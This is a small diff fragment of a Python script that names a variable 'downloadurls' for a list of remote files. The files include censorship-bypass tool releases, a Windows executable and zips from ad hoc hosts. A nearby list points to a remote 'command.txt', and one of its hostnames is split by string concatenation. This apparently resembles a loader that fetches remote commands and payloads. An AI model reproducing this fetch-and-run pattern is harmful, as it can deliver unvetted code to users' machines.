@@ -23,7 +23,7 @@ if __name__ == "__main__":
         "https://async" + "ker.neocities.org/peer/command.txt",
         "https://peerphp.vercel.app/peer/8abf9c5e-8f8f-4279-aaf8-a85ceffb602e.txt"
     ]
-    [
+    downloadurls = [
       "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.7/zapret-discord-youtube-1.9.7.zip",
       "https://github.com/Flowseal/tg-ws-proxy/releases/download/v1.2.1/TgWsProxy_windows.exe",
       "https://peerphp.vercel.app/peer/878c2c10-bcbd-419f-a762-b516bc99be29.zip",
